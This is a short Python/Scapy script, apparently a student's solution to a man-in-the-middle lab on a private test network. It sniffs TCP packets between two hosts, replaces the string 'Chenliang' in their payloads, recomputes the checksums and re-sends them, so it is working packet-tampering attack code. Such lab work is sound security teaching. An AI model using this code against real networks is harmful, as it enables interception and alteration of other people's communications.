from scapy.all import *


def expand(x):
    yield x
    while x.payload:
        x = x.payload
        yield x


def spoof_pkt(pkt):
    #res = list(expand(pkt))
    # print(res)
    s = ''
    if pkt[IP].src == IP_A and\
            pkt[IP].dst == IP_B and\
            (pkt[Ether].src == MAC_A or pkt[Ether].src == MAC_B):
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.

        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            readable_payload = bytes(
                pkt[TCP].payload).decode('UTF8', 'replace')
            # data = pkt[TCP].payload.load  # The original payload data
            if 'Chenliang' in readable_payload:
                s = readable_payload.replace('Chenliang', 'AAAAAAAAA')
                print("catch")
                print(s)
                s.encode()
                send(newpkt/s)
            else:
                readable_payload.encode()  # No change is made in this sample code
                send(newpkt/readable_payload)
        ################################################################
    elif pkt[IP].src == IP_B and\
            pkt[IP].dst == IP_A and\
            (pkt[Ether].src == MAC_A or pkt[Ether].src == MAC_B):
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)


IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

#f = 'tcp'+ ' and ether src ' + MAC_B + ' or tcp and ether src ' + MAC_A
f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
